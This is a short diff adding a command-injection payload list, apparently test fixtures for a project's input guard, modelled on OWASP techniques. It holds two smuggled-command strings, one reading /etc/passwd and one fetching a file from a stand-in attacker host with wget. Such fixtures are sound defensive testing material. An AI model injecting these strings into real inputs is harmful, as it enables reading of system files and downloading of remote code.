@@ -1,0 +1,4 @@
+# source: project-authored, representative of OWASP command-injection techniques
+# license: guard-core (project)
+; cat /etc/passwd
+| wget http://evil.example/x
